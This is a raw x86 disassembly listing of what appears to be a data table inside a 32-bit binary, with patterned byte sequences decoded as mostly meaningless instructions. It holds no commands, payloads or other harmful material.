  4097a7:	00 00                	add    %al,(%eax)
  4097a9:	00 1d 00 00 00 07    	add    %bl,0x7000000
  4097af:	07                   	pop    %es
  4097b0:	00 00                	add    %al,(%eax)
  4097b2:	00 1e                	add    %bl,(%esi)
  4097b4:	1f                   	pop    %ds
  4097b5:	1f                   	pop    %ds
  4097b6:	20 1f                	and    %bl,(%edi)
  4097b8:	20 af fe 70 29 89    	and    %ch,-0x76d68f02(%edi)
  4097be:	e1 d7                	loope  0x409797
  4097c0:	f1                   	int1
  4097c1:	34 98                	xor    $0x98,%al
  4097c3:	fa                   	cli
  4097c4:	f3 d9 fd             	repz fscale
  4097c7:	f1                   	int1
  4097c8:	15 46 64 02 d7       	adc    $0xd7026446,%eax
  4097cd:	5d                   	pop    %ebp
  4097ce:	5a                   	pop    %edx
  4097cf:	cb                   	lret
  4097d0:	2d ee 65 7e ae       	sub    $0xae7e65ee,%eax
  4097d5:	cc                   	int3
  4097d6:	4a                   	dec    %edx
  4097d7:	5f                   	pop    %edi
  4097d8:	d8 7c 7c aa          	fdivrs -0x56(%esp,%edi,2)
  4097dc:	00 00                	add    %al,(%eax)
  4097de:	00 40 40             	add    %al,0x40(%eax)
	...
  4097f1:	00 00                	add    %al,(%eax)
  4097f3:	00 2b                	add    %ch,(%ebx)
  4097f5:	57                   	push   %edi
  4097f6:	38 72 72             	cmp    %dh,0x72(%edx)
  4097f9:	38 57 2b             	cmp    %dl,0x2b(%edi)
  4097fc:	ff                   	(bad)
  4097fd:	ff                   	(bad)
  4097fe:	ff                   	(bad)
  4097ff:	ff                   	(bad)
  409800:	ff                   	(bad)
  409801:	ff                   	(bad)
  409802:	ff                   	(bad)
  409803:	ff                   	(bad)
  409804:	ff                   	(bad)
  409805:	ff                   	(bad)
  409806:	ff                   	(bad)
  409807:	ff                   	(bad)
  409808:	ff                   	(bad)
  409809:	ff                   	(bad)
  40980a:	ff                   	(bad)
  40980b:	ff 48 3e             	decl   0x3e(%eax)
  40980e:	e1 e0                	loope  0x4097f0
  409810:	e0 e1                	loopne 0x4097f3
  409812:	3e 48                	ds dec %eax
  409814:	00 00                	add    %al,(%eax)
  409816:	00 02                	add    %al,(%edx)
  409818:	02 00                	add    (%eax),%al
  40981a:	00 00                	add    %al,(%eax)
  40981c:	ff                   	(bad)
  40981d:	ff                   	(bad)
  40981e:	ff                   	(bad)
  40981f:	ff                   	(bad)
  409820:	ff                   	(bad)
  409821:	ff                   	(bad)
  409822:	ff                   	(bad)
  409823:	ff 00                	incl   (%eax)
  409825:	00 00                	add    %al,(%eax)
  409827:	00 00                	add    %al,(%eax)
  409829:	00 00                	add    %al,(%eax)
  40982b:	00 ff                	add    %bh,%bh
  40982d:	ff                   	(bad)
  40982e:	ff                   	(bad)
  40982f:	ff                   	(bad)
  409830:	ff                   	(bad)
  409831:	ff                   	(bad)
  409832:	ff                   	(bad)
  409833:	ff 21                	jmp    *(%ecx)
  409835:	86 b4 06 06 b4 86 21 	xchg   %dh,0x2186b406(%esi,%eax,1)
  40983c:	1a 52 1c             	sbb    0x1c(%edx),%dl
  40983f:	3b 3b                	cmp    (%ebx),%edi
  409841:	1c 52                	sbb    $0x52,%al
  409843:	1a 00                	sbb    (%eax),%al
  409845:	00 00                	add    %al,(%eax)
  409847:	01 01                	add    %eax,(%ecx)
	...
  409855:	00 00                	add    %al,(%eax)
  409857:	01 01                	add    %eax,(%ecx)
  409859:	00 00                	add    %al,(%eax)
  40985b:	00 ff                	add    %bh,%bh
  40985d:	ff                   	(bad)
  40985e:	ff                   	(bad)
  40985f:	ff                   	(bad)
  409860:	ff                   	(bad)
  409861:	ff                   	(bad)
  409862:	ff                   	(bad)
  409863:	ff 33                	push   (%ebx)
  409865:	fd                   	std
  409866:	01 ff                	add    %edi,%edi
  409868:	ff 01                	incl   (%ecx)
  40986a:	fd                   	std
  40986b:	33 42 bf             	xor    -0x41(%edx),%eax
  40986e:	65 07                	gs pop %es
  409870:	07                   	pop    %es
  409871:	65 bf 42 00 00 00    	gs mov $0x42,%edi
  409877:	01 01                	add    %eax,(%ecx)
  409879:	00 00                	add    %al,(%eax)
  40987b:	00 00                	add    %al,(%eax)
  40987d:	00 00                	add    %al,(%eax)
  40987f:	01 01                	add    %eax,(%ecx)
  409881:	00 00                	add    %al,(%eax)
  409883:	00 00                	add    %al,(%eax)
  409885:	00 00                	add    %al,(%eax)
  409887:	40                   	inc    %eax
  409888:	40                   	inc    %eax
  409889:	00 00                	add    %al,(%eax)
  40988b:	00 27                	add    %ah,(%edi)
  40988d:	de ce                	fmulp  %st,%st(6)
  40988f:	60                   	pusha
  409890:	60                   	pusha
  409891:	ce                   	into
  409892:	de 27                	fisubs (%edi)
  409894:	56                   	push   %esi
  409895:	e7 bc                	out    %eax,$0xbc
  409897:	ce                   	into
  409898:	ce                   	into
  409899:	bc e7 56 00 00       	mov    $0x56e7,%esp
  40989e:	00 02                	add    %al,(%edx)
  4098a0:	02 00                	add    (%eax),%al
  4098a2:	00 00                	add    %al,(%eax)
  4098a4:	00 00                	add    %al,(%eax)
  4098a6:	00 02                	add    %al,(%edx)
  4098a8:	02 00                	add    (%eax),%al
  4098aa:	00 00                	add    %al,(%eax)
  4098ac:	ff                   	(bad)
  4098ad:	ff                   	(bad)
  4098ae:	ff                   	(bad)
  4098af:	ff                   	(bad)
  4098b0:	ff                   	(bad)
  4098b1:	ff                   	(bad)
  4098b2:	ff                   	(bad)
  4098b3:	ff 4f 72             	decl   0x72(%edi)
  4098b6:	1e                   	push   %ds
  4098b7:	e9 e9 1e 72 4f       	jmp    0x4fb2b7a5
  4098bc:	3f                   	aas
  4098bd:	8a 87 ce ce 87 8a    	mov    -0x75783132(%edi),%al
  4098c3:	3f                   	aas
  4098c4:	ff                   	(bad)
  4098c5:	ff                   	(bad)
  4098c6:	ff                   	(bad)
  4098c7:	ff                   	(bad)
  4098c8:	ff                   	(bad)
  4098c9:	ff                   	(bad)
  4098ca:	ff                   	(bad)
  4098cb:	ff 00                	incl   (%eax)
	...
  4098d5:	00 00                	add    %al,(%eax)
  4098d7:	02 02                	add    (%edx),%al
  4098d9:	00 00                	add    %al,(%eax)
  4098db:	00 13                	add    %dl,(%ebx)
  4098dd:	01 21                	add    %esp,(%ecx)
  4098df:	3a 3a                	cmp    (%edx),%bh
  4098e1:	21 01                	and    %eax,(%ecx)
  4098e3:	13 7d 95             	adc    -0x6b(%ebp),%edi
  4098e6:	02 09                	add    (%ecx),%cl
  4098e8:	09 02                	or     %eax,(%edx)
  4098ea:	95                   	xchg   %eax,%ebp
  4098eb:	7d 42                	jge    0x40992f
  4098ed:	b5 60                	mov    $0x60,%ch
  4098ef:	38 38                	cmp    %bh,(%eax)
  4098f1:	60                   	pusha
  4098f2:	b5 42                	mov    $0x42,%ch
  4098f4:	13 b4 ff e4 e4 ff b4 	adc    -0x4b001b1c(%edi,%edi,8),%esi
  4098fb:	13 45 12             	adc    0x12(%ebp),%eax
  4098fe:	db 47 47             	fildl  0x47(%edi)
  409901:	db 12                	fistl  (%edx)
  409903:	45                   	inc    %ebp
  409904:	0c 2c                	or     $0x2c,%al
  409906:	9d                   	popf
  409907:	9f                   	lahf
  409908:	9f                   	lahf
  409909:	9d                   	popf
  40990a:	2c 0c                	sub    $0xc,%al
  40990c:	53                   	push   %ebx
  40990d:	d8 b6 0f 0f b6 d8    	fdivs  -0x2749f0f1(%esi)
  409913:	53                   	push   %ebx
	...
  40991c:	00 00                	add    %al,(%eax)
  40991e:	00 02                	add    %al,(%edx)
  409920:	02 00                	add    (%eax),%al
  409922:	00 00                	add    %al,(%eax)
  409924:	00 00                	add    %al,(%eax)
  409926:	00 01                	add    %al,(%ecx)
  409928:	01 00                	add    %eax,(%eax)
  40992a:	00 00                	add    %al,(%eax)
  40992c:	41                   	inc    %ecx
  40992d:	70 76                	jo     0x4099a5
  40992f:	bc bc 76 70 41       	mov    $0x417076bc,%esp
  409934:	27                   	daa
  409935:	d7                   	xlat   %ds:(%ebx)
  409936:	18 8b 8b 18 d7 27    	sbb    %cl,0x27d7188b(%ebx)
  40993c:	4c                   	dec    %esp
  40993d:	9d                   	popf
  40993e:	e3 52                	jecxz  0x409992
  409940:	52                   	push   %edx
  409941:	e3 9d                	jecxz  0x4098e0
  409943:	4c                   	dec    %esp
  409944:	19 ea                	sbb    %ebp,%edx
  409946:	91                   	xchg   %eax,%ecx
  409947:	98                   	cwtl
  409948:	98                   	cwtl
  409949:	91                   	xchg   %eax,%ecx
  40994a:	ea 19 57 ca 13 b7 b7 	ljmp   $0xb7b7,$0x13ca5719
  409951:	13 ca                	adc    %edx,%ecx
  409953:	57                   	push   %edi
  409954:	6c                   	insb   (%dx),%es:(%edi)
  409955:	74 ab                	je     0x409902
  409957:	41                   	inc    %ecx
  409958:	41                   	inc    %ecx
  409959:	ab                   	stos   %eax,%es:(%edi)
  40995a:	74 6c                	je     0x4099c8
  40995c:	40                   	inc    %eax
  40995d:	c4 0b                	les    (%ebx),%ecx
  40995f:	fc                   	cld
  409960:	fc                   	cld
  409961:	0b c4                	or     %esp,%eax
  409963:	40                   	inc    %eax
  409964:	ff                   	(bad)
  409965:	ff                   	(bad)
  409966:	ff                   	(bad)
  409967:	ff                   	(bad)
  409968:	ff                   	(bad)
  409969:	ff                   	(bad)
  40996a:	ff                   	(bad)
  40996b:	ff 00                	incl   (%eax)
  40996d:	00 00                	add    %al,(%eax)
  40996f:	03 03                	add    (%ebx),%eax
  409971:	00 00                	add    %al,(%eax)
  409973:	00 00                	add    %al,(%eax)
  409975:	00 00                	add    %al,(%eax)
  409977:	01 01                	add    %eax,(%ecx)
  409979:	00 00                	add    %al,(%eax)
  40997b:	00 4d 95             	add    %cl,-0x6b(%ebp)
  40997e:	cf                   	iret
  40997f:	de de                	(bad)
  409981:	cf                   	iret
  409982:	95                   	xchg   %eax,%ebp
  409983:	4d                   	dec    %ebp
  409984:	34 0b                	xor    $0xb,%al
  409986:	07                   	pop    %es
  409987:	a9 a9 07 0b 34       	test   $0x340b07a9,%eax
  40998c:	1e                   	push   %ds
  40998d:	a0 f8 4d 4d f8       	mov    0xf84d4df8,%al
  409992:	a0 1e 37 a4 08       	mov    0x8a4371e,%al
  409997:	da da                	fcmovu %st(2),%st
  409999:	08 a4 37 2b 40 65 44 	or     %ah,0x4465402b(%edi,%esi,1)
  4099a0:	44                   	inc    %esp
  4099a1:	65 40                	gs inc %eax
  4099a3:	2b 18                	sub    (%eax),%ebx
  4099a5:	8b b4 37 37 b4 8b 18 	mov    0x188bb437(%edi,%esi,1),%esi
  4099ac:	76 e2                	jbe    0x409990
  4099ae:	ce                   	into
  4099af:	85 85 ce e2 76 2d    	test   %eax,0x2d76e2ce(%ebp)
  4099b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b6:	40                   	inc    %eax
  4099b7:	ea 29 e0 72 2b e6 3f 	ljmp   $0x3fe6,$0x2b72e029
  4099be:	83 27 f3             	andl   $0xfffffff3,(%edi)
  4099c1:	57                   	push   %edi
  4099c2:	9c                   	pushf
  4099c3:	2d 7e ac 09 b9       	sub    $0xb909ac7e,%eax
  4099c8:	8b 9b 8a e1 af 43    	mov    0x43afe18a(%ebx),%ebx
  4099ce:	4c                   	dec    %esp
  4099cf:	05 d5 ef 6e 93       	add    $0x936eefd5,%eax
  4099d4:	92                   	xchg   %eax,%edx
  4099d5:	ca c2 51             	lret   $0x51c2
  4099d8:	bb 78 9a f3 1a       	mov    $0x1af39a78,%ebx
  4099dd:	bb 2d de 27 17       	mov    $0x1727de2d,%ebx
  4099e2:	1c a3                	sbb    $0xa3,%al
  4099e4:	c4 b3 19 83 20 d5    	les    -0x2adf7ce7(%ebx),%esi
  4099ea:	7d ea                	jge    0x4099d6
  4099ec:	a8 78                	test   $0x78,%al
  4099ee:	b4 a3                	mov    $0xa3,%ah
  4099f0:	bc 40 0f c2 06       	mov    $0x6c20f40,%esp
  4099f5:	f8                   	clc
  4099f6:	be 42 76 8d ed       	mov    $0xed8d7642,%esi
  4099fb:	d6                   	salc
  4099fc:	88 21                	mov    %ah,(%ecx)
  4099fe:	b1 c5                	mov    $0xc5,%cl
  409a00:	fb                   	sti
  409a01:	28 06                	sub    %al,(%esi)
  409a03:	ba 5e 0d 0b 3e       	mov    $0x3e0b0d5e,%edx
  409a08:	27                   	daa
  409a09:	25 b9 6b c6 c6       	and    $0xc6c66bb9,%eax
  409a0e:	6b b9 25 00 00 00 c0 	imul   $0xffffffc0,0x25(%ecx),%edi
  409a15:	c0 00 00             	rolb   $0x0,(%eax)
  409a18:	00 00                	add    %al,(%eax)
  409a1a:	00 00                	add    %al,(%eax)
  409a1c:	04 04                	add    $0x4,%al
  409a1e:	00 00                	add    %al,(%eax)
  409a20:	00 ff                	add    %bh,%bh
  409a22:	ff                   	(bad)
  409a23:	ff                   	(bad)
  409a24:	ff                   	(bad)
  409a25:	ff                   	(bad)
  409a26:	ff                   	(bad)
  409a27:	ff                   	(bad)
  409a28:	ff 00                	incl   (%eax)
  409a2a:	00 00                	add    %al,(%eax)
  409a2c:	0b 0b                	or     (%ebx),%ecx
  409a2e:	00 00                	add    %al,(%eax)
  409a30:	00 12                	add    %dl,(%edx)
  409a32:	f0 14 d2             	lock adc $0xd2,%al
  409a35:	d2 14 f0             	rclb   %cl,(%eax,%esi,8)
  409a38:	12 1d 95 13 29 29    	adc    0x29291395,%bl
  409a3e:	13 95 1d ff ff ff    	adc    -0xe3(%ebp),%edx
  409a44:	ff                   	(bad)
  409a45:	ff                   	(bad)
  409a46:	ff                   	(bad)
  409a47:	ff                   	(bad)
  409a48:	ff 00                	incl   (%eax)
  409a4a:	00 00                	add    %al,(%eax)
  409a4c:	48                   	dec    %eax
  409a4d:	48                   	dec    %eax
  409a4e:	00 00                	add    %al,(%eax)
  409a50:	00 60 36             	add    %ah,0x36(%eax)
  409a53:	00 bc bc 00 36 60 00 	add    %bh,0x603600(%esp,%edi,4)
  409a5a:	00 00                	add    %al,(%eax)
  409a5c:	90                   	nop
  409a5d:	90                   	nop
	...
  409a66:	00 00                	add    %al,(%eax)
  409a68:	00 ff                	add    %bh,%bh
  409a6a:	ff                   	(bad)
  409a6b:	ff                   	(bad)
  409a6c:	ff                   	(bad)
  409a6d:	ff                   	(bad)
  409a6e:	ff                   	(bad)
  409a6f:	ff                   	(bad)
  409a70:	ff 00                	incl   (%eax)
  409a72:	00 00                	add    %al,(%eax)
  409a74:	0f                   	(bad)
  409a75:	0f 00 00             	sldt   (%eax)
  409a78:	00 35 2a 81 2b 2b    	add    %dh,0x2b2b812a
  409a7e:	81 2a 35 1d 69 a6    	subl   $0xa6691d35,(%edx)
  409a84:	e6 e6                	out    %al,$0xe6
  409a86:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409a87:	69 1d 00 00 00 00 00 	imul   $0x0,0x0,%ebx
  409a8e:	00 00 00 
  409a91:	ff                   	(bad)
  409a92:	ff                   	(bad)
  409a93:	ff                   	(bad)
  409a94:	ff                   	(bad)
  409a95:	ff                   	(bad)
  409a96:	ff                   	(bad)
  409a97:	ff                   	(bad)
  409a98:	ff                   	(bad)
  409a99:	ff                   	(bad)
  409a9a:	ff                   	(bad)
  409a9b:	ff                   	(bad)
  409a9c:	ff                   	(bad)
  409a9d:	ff                   	(bad)
  409a9e:	ff                   	(bad)
  409a9f:	ff                   	(bad)
  409aa0:	ff 00                	incl   (%eax)
  409aa2:	00 00                	add    %al,(%eax)
  409aa4:	48                   	dec    %eax
  409aa5:	48                   	dec    %eax
  409aa6:	00 00                	add    %al,(%eax)
  409aa8:	00 04 a6             	add    %al,(%esi,%eiz,4)
  409aab:	35 bf bf 35 a6       	xor    $0xa635bfbf,%eax
  409ab0:	04 00                	add    $0x0,%al
  409ab2:	00 00                	add    %al,(%eax)
  409ab4:	05 05 00 00 00       	add    $0x5,%eax
  409ab9:	25 b5 01 27 27       	and    $0x272701b5,%eax
  409abe:	01 b5 25 ff ff ff    	add    %esi,-0xdb(%ebp)
  409ac4:	ff                   	(bad)
  409ac5:	ff                   	(bad)
  409ac6:	ff                   	(bad)
  409ac7:	ff                   	(bad)
  409ac8:	ff 00                	incl   (%eax)
  409aca:	00 00                	add    %al,(%eax)
  409acc:	90                   	nop
  409acd:	90                   	nop
	...
  409ad6:	00 00                	add    %al,(%eax)
  409ad8:	00 73 9e             	add    %dh,-0x62(%ebx)
  409adb:	cc                   	int3
  409adc:	c4                   	(bad)
  409add:	c4                   	(bad)
  409ade:	cc                   	int3
  409adf:	9e                   	sahf
  409ae0:	73 00                	jae    0x409ae2
  409ae2:	00 00                	add    %al,(%eax)
  409ae4:	0a 0a                	or     (%edx),%cl
  409ae6:	00 00                	add    %al,(%eax)
  409ae8:	00 50 9f             	add    %dl,-0x61(%eax)
  409aeb:	d6                   	salc
  409aec:	57                   	push   %edi
  409aed:	57                   	push   %edi
  409aee:	d6                   	salc
  409aef:	9f                   	lahf
  409af0:	50                   	push   %eax
	...
  409af9:	5b                   	pop    %ebx
  409afa:	2e 04 35             	cs add $0x35,%al
  409afd:	35 04 2e 5b 00       	xor    $0x5b2e04,%eax
  409b02:	00 00                	add    %al,(%eax)
  409b04:	04 04                	add    $0x4,%al
  409b06:	00 00                	add    %al,(%eax)
  409b08:	00 00                	add    %al,(%eax)
  409b0a:	00 00                	add    %al,(%eax)
  409b0c:	01 01                	add    %eax,(%ecx)
  409b0e:	00 00                	add    %al,(%eax)
  409b10:	00 7c fb 78          	add    %bh,0x78(%ebx,%edi,8)
  409b14:	87 87 78 fb 7c 34    	xchg   %eax,0x347cfb78(%edi)
  409b1a:	2f                   	das
  409b1b:	d6                   	salc
  409b1c:	2d 2d d6 2f 34       	sub    $0x342fd62d,%eax
  409b21:	26 47                	es inc %edi
  409b23:	17                   	pop    %ss
  409b24:	27                   	daa
  409b25:	27                   	daa
  409b26:	17                   	pop    %ss
  409b27:	47                   	inc    %edi
  409b28:	26 08 b0 fe 55 55 fe 	or     %dh,%es:-0x1aaaa02(%eax)
  409b2f:	b0 08                	mov    $0x8,%al
  409b31:	ff                   	(bad)
  409b32:	ff                   	(bad)
  409b33:	ff                   	(bad)
  409b34:	ff                   	(bad)
  409b35:	ff                   	(bad)
  409b36:	ff                   	(bad)
  409b37:	ff                   	(bad)
  409b38:	ff                   	(bad)
  409b39:	3d b4 e2 ac ac       	cmp    $0xacace2b4,%eax
  409b3e:	e2 b4                	loop   0x409af4
  409b40:	3d 6c 32 5e 00       	cmp    $0x5e326c,%eax
  409b45:	00 5e 32             	add    %bl,0x32(%esi)
  409b48:	6c                   	insb   (%dx),%es:(%edi)
  409b49:	00 00                	add    %al,(%eax)
  409b4b:	00 05 05 00 00 00    	add    %al,0x5
  409b51:	00 00                	add    %al,(%eax)
  409b53:	00 05 05 00 00 00    	add    %al,0x5
  409b59:	76 86                	jbe    0x409ae1
  409b5b:	f9                   	stc
  409b5c:	b9 b9 f9 86 76       	mov    $0x7686f9b9,%ecx
  409b61:	62 a9 7b 86 86 7b    	bound  %ebp,0x7b86867b(%ecx)
  409b67:	a9 62 77 de 99       	test   $0x99de7762,%eax
  409b6c:	90                   	nop
  409b6d:	90                   	nop
  409b6e:	99                   	cltd
  409b6f:	de 77 79             	fidivs 0x79(%edi)
  409b72:	fd                   	std
  409b73:	f1                   	int1
  409b74:	6b 6b f1 fd          	imul   $0xfffffffd,-0xf(%ebx),%ebp
  409b78:	79 00                	jns    0x409b7a
  409b7a:	00 00                	add    %al,(%eax)
  409b7c:	90                   	nop
  409b7d:	90                   	nop
  409b7e:	00 00                	add    %al,(%eax)
  409b80:	00 4d bb             	add    %cl,-0x45(%ebp)
  409b83:	68 9b 9b 68 bb       	push   $0xbb689b9b
  409b88:	4d                   	dec    %ebp
  409b89:	4d                   	dec    %ebp
  409b8a:	af                   	scas   %es:(%edi),%eax
  409b8b:	62 e2 e2             	(bad) {%k2}
  409b8e:	62 af 4d 00 00 00    	bound  %ebp,0x4d(%edi)
  409b94:	0a 0a                	or     (%edx),%cl
  409b96:	00 00                	add    %al,(%eax)
  409b98:	00 00                	add    %al,(%eax)
  409b9a:	00 00                	add    %al,(%eax)
  409b9c:	01 01                	add    %eax,(%ecx)
  409b9e:	00 00                	add    %al,(%eax)
  409ba0:	00 1c 3a             	add    %bl,(%edx,%edi,1)
  409ba3:	fe 8a 8a fe 3a 1c    	decb   0x1c3afe8a(%edx)
  409ba9:	11 cd                	adc    %ecx,%ebp
  409bab:	11 e1                	adc    %esp,%ecx
  409bad:	e1 11                	loope  0x409bc0
  409baf:	cd 11                	int    $0x11
  409bb1:	26 73 71             	es jae 0x409c25
  409bb4:	8c 8c 71 73 26 2e 74 	mov    %cs,0x742e2673(%ecx,%esi,2)
  409bbb:	81 af af 81 74 2e 00 	subl   $0xc0000000,0x2e7481af(%edi)
  409bc2:	00 00 c0 
  409bc5:	c0 00 00             	rolb   $0x0,(%eax)
  409bc8:	00 47 43             	add    %al,0x43(%edi)
  409bcb:	e1 43                	loope  0x409c10
  409bcd:	43                   	inc    %ebx
  409bce:	e1 43                	loope  0x409c13
  409bd0:	47                   	inc    %edi
  409bd1:	21 0d 32 ba ba 32    	and    %ecx,0x32baba32
  409bd7:	0d 21 00 00 00       	or     $0x21,%eax
  409bdc:	0b 0b                	or     (%ebx),%ecx
  409bde:	00 00                	add    %al,(%eax)
  409be0:	00 00                	add    %al,(%eax)
  409be2:	00 00                	add    %al,(%eax)
  409be4:	04 04                	add    $0x4,%al
  409be6:	00 00                	add    %al,(%eax)
  409be8:	00 1f                	add    %bl,(%edi)
  409bea:	51                   	push   %ecx
  409beb:	48                   	dec    %eax
  409bec:	0d 0d 48 51 1f       	or     $0x1f51480d,%eax
  409bf1:	20 b6 89 ef ef 89    	and    %dh,-0x76101077(%esi)
  409bf7:	b6 20                	mov    $0x20,%dh
  409bf9:	13 74 70 05          	adc    0x5(%eax,%esi,2),%esi
  409bfd:	05 70 74 13 25       	add    $0x25137470,%eax
  409c02:	14 63                	adc    $0x63,%al
  409c04:	da da                	fcmovu %st(2),%st
  409c06:	63 14 25 00 00 00 90 	arpl   %edx,-0x70000000(,%eiz,1)
  409c0d:	90                   	nop
  409c0e:	00 00                	add    %al,(%eax)
  409c10:	00 3b                	add    %bh,(%ebx)
  409c12:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409c13:	3d d5 d5 3d a7       	cmp    $0xa73dd5d5,%eax
  409c18:	3b 0e                	cmp    (%esi),%ecx
  409c1a:	62 d3 ef ef d3       	(bad)
  409c1f:	62 0e                	bound  %ecx,(%esi)
  409c21:	00 00                	add    %al,(%eax)
  409c23:	00 0f                	add    %cl,(%edi)
  409c25:	0f 00 00             	sldt   (%eax)
  409c28:	00 00                	add    %al,(%eax)
  409c2a:	00 00                	add    %al,(%eax)
  409c2c:	02 02                	add    (%edx),%al
  409c2e:	00 00                	add    %al,(%eax)
  409c30:	00 0e                	add    %cl,(%esi)
  409c32:	e3 6a                	jecxz  0x409c9e
  409c34:	04 04                	add    $0x4,%al
  409c36:	6a e3                	push   $0xffffffe3
  409c38:	0e                   	push   %cs
  409c39:	14 b8                	adc    $0xb8,%al
  409c3b:	a8 91                	test   $0x91,%al
  409c3d:	91                   	xchg   %eax,%ecx
  409c3e:	a8 b8                	test   $0xb8,%al
  409c40:	14 58                	adc    $0x58,%al
  409c42:	fd                   	std
  409c43:	66 21 21             	and    %sp,(%ecx)
  409c46:	66 fd                	data16 std
  409c48:	58                   	pop    %eax
  409c49:	38 91 68 93 93 68    	cmp    %dl,0x68939368(%ecx)
  409c4f:	91                   	xchg   %eax,%ecx
  409c50:	38 ff                	cmp    %bh,%bh
  409c52:	ff                   	(bad)
  409c53:	ff                   	(bad)
  409c54:	ff                   	(bad)
  409c55:	ff                   	(bad)
  409c56:	ff                   	(bad)
  409c57:	ff                   	(bad)
  409c58:	ff 74 11 6d          	push   0x6d(%ecx,%edx,1)
  409c5c:	97                   	xchg   %eax,%edi
  409c5d:	97                   	xchg   %eax,%edi
  409c5e:	6d                   	insl   (%dx),%es:(%edi)
  409c5f:	11 74 7f e0          	adc    %esi,-0x20(%edi,%edi,2)
  409c63:	b6 92                	mov    $0x92,%dh
  409c65:	92                   	xchg   %eax,%edx
  409c66:	b6 e0                	mov    $0xe0,%dh
  409c68:	7f 00                	jg     0x409c6a
  409c6a:	00 00                	add    %al,(%eax)
  409c6c:	04 04                	add    $0x4,%al
  409c6e:	00 00                	add    %al,(%eax)
  409c70:	00 00                	add    %al,(%eax)
  409c72:	00 00                	add    %al,(%eax)
  409c74:	07                   	pop    %es
  409c75:	07                   	pop    %es
  409c76:	00 00                	add    %al,(%eax)
  409c78:	00 02                	add    %al,(%edx)
  409c7a:	ad                   	lods   %ds:(%esi),%eax
  409c7b:	60                   	pusha
  409c7c:	64 64 60             	fs fs pusha
  409c7f:	ad                   	lods   %ds:(%esi),%eax
  409c80:	02 69 3d             	add    0x3d(%ecx),%ch
  409c83:	38 87 87 38 3d 69    	cmp    %al,0x693d3887(%edi)
  409c89:	ff                   	(bad)
  409c8a:	ff                   	(bad)
  409c8b:	ff                   	(bad)
  409c8c:	ff                   	(bad)
  409c8d:	ff                   	(bad)
  409c8e:	ff                   	(bad)
  409c8f:	ff                   	(bad)
  409c90:	ff 25 e3 64 29 29    	jmp    *0x292964e3
  409c96:	64 e3 25             	fs jecxz 0x409cbe
  409c99:	2f                   	das
  409c9a:	2f                   	das
  409c9b:	26 57                	es push %edi
  409c9d:	57                   	push   %edi
  409c9e:	26 2f                	es das
  409ca0:	2f                   	das
  409ca1:	00 00                	add    %al,(%eax)
  409ca3:	00 0b                	add    %cl,(%ebx)
  409ca5:	0b 00                	or     (%eax),%eax
  409ca7:	00 00                	add    %al,(%eax)
  409ca9:	00 00                	add    %al,(%eax)
  409cab:	00 03                	add    %al,(%ebx)
  409cad:	03 00                	add    (%eax),%eax
  409caf:	00 00                	add    %al,(%eax)
  409cb1:	3e f3 05 ab ab 05 f3 	ds repz add $0xf305abab,%eax
  409cb8:	3e 55                	ds push %ebp
  409cba:	18 39                	sbb    %bh,(%ecx)
  409cbc:	bb bb 39 18 55       	mov    $0x551839bb,%ebx
	...
  409cc9:	4e                   	dec    %esi
  409cca:	86 f6                	xchg   %dh,%dh
  409ccc:	d8 d8                	fcomp  %st(0)
  409cce:	f6 86 4e 08 e4 fa eb 	testb  $0xeb,-0x51bf7b2(%esi)
  409cd5:	eb fa                	jmp    0x409cd1
  409cd7:	e4 08                	in     $0x8,%al
  409cd9:	00 00                	add    %al,(%eax)
  409cdb:	00 0e                	add    %cl,(%esi)
  409cdd:	0e                   	push   %cs
  409cde:	00 00                	add    %al,(%eax)
  409ce0:	00 00                	add    %al,(%eax)
  409ce2:	00 00                	add    %al,(%eax)
  409ce4:	01 01                	add    %eax,(%ecx)
  409ce6:	00 00                	add    %al,(%eax)
  409ce8:	00 31                	add    %dh,(%ecx)
  409cea:	5c                   	pop    %esp
  409ceb:	de 32                	fidivs (%edx)
  409ced:	32 de                	xor    %dh,%bl
  409cef:	5c                   	pop    %esp
  409cf0:	31 79 7d             	xor    %edi,0x7d(%ecx)
  409cf3:	72 0f                	jb     0x409d04
  409cf5:	0f 72                	(bad)
  409cf7:	7d 79                	jge    0x409d72
  409cf9:	ff                   	(bad)
  409cfa:	ff                   	(bad)
  409cfb:	ff                   	(bad)
  409cfc:	ff                   	(bad)
  409cfd:	ff                   	(bad)
  409cfe:	ff                   	(bad)
  409cff:	ff                   	(bad)
  409d00:	ff 2a                	ljmp   *(%edx)
  409d02:	ea 08 1a 1a 08 ea 2a 	ljmp   $0x2aea,$0x81a1a08
  409d09:	71 51                	jno    0x409d5c
  409d0b:	0f 26 26             	mov    %esi,%tr4
  409d0e:	0f 51 71 00          	sqrtps 0x0(%ecx),%xmm6
  409d12:	00 00                	add    %al,(%eax)
  409d14:	0f                   	(bad)
  409d15:	0f 00 00             	sldt   (%eax)
  409d18:	00 00                	add    %al,(%eax)
  409d1a:	00 00                	add    %al,(%eax)
  409d1c:	01 01                	add    %eax,(%ecx)
  409d1e:	00 00                	add    %al,(%eax)
  409d20:	00 3c 37             	add    %bh,(%edi,%esi,1)
  409d23:	5b                   	pop    %ebx
  409d24:	bb bb 5b 37 3c       	mov    $0x3c375bbb,%ebx
  409d29:	6b 9b 1d 7c 7c 1d 9b 	imul   $0xffffff9b,0x1d7c7c1d(%ebx),%ebx
  409d30:	6b 00 00             	imul   $0x0,(%eax),%eax
  409d33:	00 48 48             	add    %cl,0x48(%eax)
  409d36:	00 00                	add    %al,(%eax)
  409d38:	00 35 8a 9d 2d 2d    	add    %dh,0x2d2d9d8a
  409d3e:	9d                   	popf
  409d3f:	8a 35 3e cb f8 de    	mov    0xdef8cb3e,%dh
  409d45:	de f8                	fdivrp %st,%st(0)
  409d47:	cb                   	lret
  409d48:	3e 00 00             	add    %al,%ds:(%eax)
  409d4b:	00 10                	add    %dl,(%eax)
  409d4d:	10 00                	adc    %al,(%eax)
  409d4f:	00 00                	add    %al,(%eax)
  409d51:	00 00                	add    %al,(%eax)
  409d53:	00 01                	add    %al,(%ecx)
  409d55:	01 00                	add    %eax,(%eax)
  409d57:	00 00                	add    %al,(%eax)
  409d59:	63 a9 95 f6 f6 95    	arpl   %ebp,-0x6a09096b(%ecx)
  409d5f:	a9 63 76 ec ec       	test   $0xecec7663,%eax
  409d64:	17                   	pop    %ss
  409d65:	17                   	pop    %ss
  409d66:	ec                   	in     (%dx),%al
  409d67:	ec                   	in     (%dx),%al
  409d68:	76 ff                	jbe    0x409d69
  409d6a:	ff                   	(bad)
  409d6b:	ff                   	(bad)
  409d6c:	ff                   	(bad)
  409d6d:	ff                   	(bad)
